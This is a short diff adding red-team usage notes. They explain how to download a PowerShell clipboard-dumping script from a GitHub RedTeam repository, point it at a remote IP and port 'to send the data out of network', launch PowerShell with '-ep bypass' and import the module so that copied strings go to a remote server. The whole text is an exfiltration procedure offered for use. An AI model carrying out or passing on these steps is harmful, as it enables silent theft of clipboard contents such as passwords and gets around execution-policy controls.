@@ -1,0 +1,6 @@
+Download the script from 
+https://github.com/nallamuthu/RedTeam/blob/master/Invoke-DumpClipboard.ps1
+Replace the Remote IP and Port to send the data out of network
+powershell -ep bypass
+Import-Module .\Invoke-DumpClipboard.ps1
+Copy any string. It will be sent to the remote server
